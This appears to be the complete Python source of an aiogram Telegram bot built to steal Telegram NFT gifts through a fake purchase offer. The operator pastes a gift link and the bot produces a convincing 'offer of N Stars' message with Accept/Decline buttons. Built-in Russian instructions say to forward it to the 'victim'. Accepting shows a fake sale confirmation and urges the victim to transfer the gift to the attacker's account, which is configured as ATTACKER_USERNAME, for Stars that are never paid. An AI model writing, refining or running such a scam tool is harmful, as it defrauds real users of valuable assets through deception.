import asyncio
import logging
import json
import re
from pathlib import Path

from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command, CommandObject
from aiogram.types import (
    Message,
    CallbackQuery,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    InputMediaPhoto,
)
from aiogram.enums import ParseMode

import config

logging.basicConfig(level=logging.INFO)
bot = Bot(token=config.BOT_TOKEN)
dp = Dispatcher()

TEMPLATES_FILE = Path("templates.json")

DEFAULT_TEMPLATES = {
    "icecream": {
        "gift_name": "Ice Cream #201001",
        "stars": 7000,
        "image": "https://cdn.changes.tg/gifts/models/Ice%20Cream/png/Original.png",
        "expiry": "5h 59m"
    }
}


def load_templates() -> dict:
    if TEMPLATES_FILE.exists():
        try:
            return json.loads(TEMPLATES_FILE.read_text(encoding="utf-8"))
        except Exception:
            pass
    return DEFAULT_TEMPLATES.copy()


def save_templates(templates: dict):
    TEMPLATES_FILE.write_text(json.dumps(templates, ensure_ascii=False, indent=2), encoding="utf-8")


templates = load_templates()
current_default = list(templates.keys())[0] if templates else "icecream"
current_buyer = config.ATTACKER_USERNAME


def is_admin(user_id: int) -> bool:
    return user_id in config.ADMIN_IDS


def parse_gift_link(text: str) -> dict | None:
    m = re.search(r't\.me/nft/([A-Za-z0-9]+)-(\d+)', text)
    if m:
        name_raw = m.group(1)
        num = m.group(2)
        gift_name = re.sub(r'([a-z])([A-Z])', r'\1 \2', name_raw)
        slug = f"{name_raw.lower()}-{num}"
        image = f"https://nft.fragment.com/gift/{slug}.medium.jpg"
        return {
            "gift_name": f"{gift_name} #{num}",
            "slug": slug,
            "image": image,
            "num": num
        }
    return None


def offer_keyboard(gift_name: str, stars: int) -> InlineKeyboardMarkup:
    # Regular buttons, no WebApp
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(
                text="✗ Decline",
                callback_data=f"decline:{gift_name[:40]}"
            ),
            InlineKeyboardButton(
                text="✓ Accept",
                callback_data=f"accept:{gift_name[:40]}:{stars}"
            )
        ]
    ])


def build_offer_caption(gift_name: str, stars: int, buyer: str, expiry: str) -> str:
    return (
        f"<b>User {buyer} is offering you\n"
        f"{stars} Stars for the gift {gift_name}.</b>\n\n"
        f"This offer expires in <b>{expiry}</b>."
    )


@dp.message(Command("start"))
async def cmd_start(message: Message):
    if not is_admin(message.from_user.id):
        await message.answer("Access denied.")
        return

    text = (
        "<b>Gift Offer Bot</b>\n\n"
        "Кинь ссылку + цену (опционально):\n"
        "<code>https://t.me/nft/IceCream-201001 15000</code>
или просто ссылку (тогда 7000 Stars)\n\n"
        "Бот пришлёт готовое сообщение с кнопками Accept/Decline.\n"
        "Перешли его жертве.\n\n"
        "Команды:\n"
        "/templates\n"
        "/newtemplate имя подарок звезды\n"
        "/setdefault имя\n\n"
        f"Attacker: <code>@{current_buyer}</code>"
    )
    await message.answer(text, parse_mode=ParseMode.HTML)


@dp.message(Command("templates"))
async def cmd_templates(message: Message):
    if not is_admin(message.from_user.id):
        return
    if not templates:
        await message.answer("Шаблонов нет.")
        return
    lines = ["<b>Шаблоны:</b>\n"]
    for name, t in templates.items():
        mark = " ← default" if name == current_default else ""
        lines.append(f"• <code>{name}</code>{mark}\n  {t['gift_name']} — {t['stars']} Stars")
    await message.answer("\n".join(lines), parse_mode=ParseMode.HTML)


@dp.message(Command("newtemplate"))
async def cmd_newtemplate(message: Message, command: CommandObject):
    if not is_admin(message.from_user.id):
        return
    if not command.args:
        await message.answer(
            "Формат:\n<code>/newtemplate имя подарок звезды</code>",
            parse_mode=ParseMode.HTML
        )
        return

    parts = command.args.split()
    if len(parts) < 3:
        await message.answer("Минимум: имя, название, звёзды")
        return

    name = parts[0].lower()
    try:
        stars = int(parts[-1])
        gift_name = " ".join(parts[1:-1])
    except ValueError:
        await message.answer("Последнее число — количество звёзд")
        return

    templates[name] = {
        "gift_name": gift_name,
        "stars": stars,
        "image": config.DEFAULT_GIFT_IMAGE,
        "expiry": "5h 59m"
    }
    save_templates(templates)
    await message.answer(f"Шаблон <code>{name}</code> сохранён.", parse_mode=ParseMode.HTML)


@dp.message(Command("setdefault"))
async def cmd_setdefault(message: Message, command: CommandObject):
    global current_default
    if not is_admin(message.from_user.id):
        return
    if not command.args:
        return
    name = command.args.strip().lower()
    if name in templates:
        current_default = name
        await message.answer(f"Default: <code>{name}</code>", parse_mode=ParseMode.HTML)



@dp.message(Command("setbuyer"))
async def cmd_setbuyer(message: Message, command: CommandObject):
    global current_buyer
    if not is_admin(message.from_user.id):
        return
    if not command.args:
        await message.answer(f"Текущий buyer: <code>@{current_buyer}</code>\n\nФормат: <code>/setbuyer username</code>", parse_mode=ParseMode.HTML)
        return
    current_buyer = command.args.strip().lstrip("@")
    await message.answer(f"Buyer изменён на <code>@{current_buyer}</code>", parse_mode=ParseMode.HTML)


@dp.message(F.text)
async def on_text(message: Message):
    if not is_admin(message.from_user.id):
        return

    text = message.text or ""
    gift = parse_gift_link(text)
    if not gift:
        return

    stars_match = re.search(r"\b(\d{3,6})\b", text)
    stars = int(stars_match.group(1)) if stars_match else config.DEFAULT_STARS
    expiry = "5h 59m"
    caption = build_offer_caption(gift["gift_name"], stars, current_buyer, expiry)
    kb = offer_keyboard(gift["gift_name"], stars)

    await message.answer(
        f"Готовый оффер на <b>{gift['gift_name']}</b> ({stars} Stars).\n"
        "Перешли сообщение ниже жертве.",
        parse_mode=ParseMode.HTML
    )

    try:
        await message.answer_photo(
            photo=gift["image"],
            caption=caption,
            reply_markup=kb,
            parse_mode=ParseMode.HTML
        )
    except Exception:
        # fallback without photo
        await message.answer(caption, reply_markup=kb, parse_mode=ParseMode.HTML)


@dp.callback_query(F.data.startswith("decline:"))
async def on_decline(callback: CallbackQuery):
    await callback.message.edit_caption(
        caption="Offer declined.",
        reply_markup=None
    )
    await callback.answer()


@dp.callback_query(F.data.startswith("accept:"))
async def on_accept(callback: CallbackQuery):
    # data format: accept:Gift Name:stars
    parts = callback.data.split(":", 2)
    gift_name = parts[1] if len(parts) > 1 else "Gift"
    stars = parts[2] if len(parts) > 2 else "7000"

    # Edit original message
    try:
        await callback.message.edit_caption(
            caption=(
                f"<b>The offer to sell {gift_name} has been successfully accepted.</b>\n\n"
                f"Transfer the gift to the buyer to have {stars} Stars credited to your balance."
            ),
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="Transfer", callback_data="transfer_done")]
            ]),
            parse_mode=ParseMode.HTML
        )
    except Exception:
        pass

    # Also send a follow-up
    await callback.message.answer(
        f"🎁 Gift <b>{gift_name}</b> has been successfully sold!\n\n"
        f"• Transfer the gift to <b>@{current_buyer}</b> to receive your Stars.",
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Open profile", url=f"https://t.me/{current_buyer}")]
        ])
    )
    await callback.answer("Accepted")


@dp.callback_query(F.data == "transfer_done")
async def on_transfer(callback: CallbackQuery):
    await callback.answer("Send the gift to the buyer")
    await callback.message.answer(
        f"Send the gift to <b>@{current_buyer}</b> to receive Stars.",
        parse_mode=ParseMode.HTML
    )


@dp.message(F.web_app_data)
async def on_webapp_data(message: Message):
    pass  # unused now


async def main():
    print("Bot started (no WebApp mode).")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
